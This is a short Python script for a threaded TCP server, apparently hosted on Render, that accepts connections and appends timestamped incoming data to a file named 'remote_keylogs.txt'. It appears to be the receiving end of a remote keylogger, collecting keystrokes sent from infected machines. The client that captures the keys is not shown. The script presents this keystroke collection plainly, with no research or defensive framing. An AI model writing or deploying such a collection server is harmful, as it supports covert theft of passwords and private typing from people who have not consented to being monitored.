import socket
import datetime
from threading import Thread

# Render provides PORT environment variable; default to 10000 if not set
import os
SERVER_PORT = int(os.getenv("PORT", 10000))
SERVER_HOST = "0.0.0.0"  # Listen on all interfaces
LOG_FILE = "remote_keylogs.txt"

def handle_client(conn, addr):
    print(f"Connected by {addr}")
    try:
        while True:
            data = conn.recv(1024).decode()
            if not data:
                break
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"{timestamp} - {data}"
            print(log_entry)
            with open(LOG_FILE, "a") as f:
                f.write(log_entry + "\n")
    except Exception as e:
        print(f"Error with {addr}: {e}")
    finally:
        conn.close()

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(5)  # Allow multiple connections
    print(f"Server listening on {SERVER_HOST}:{SERVER_PORT}")

    while True:
        conn, addr = server_socket.accept()
        # Handle each client in a separate thread
        client_thread = Thread(target=handle_client, args=(conn, addr))
        client_thread.start()

if __name__ == "__main__":
    start_server()
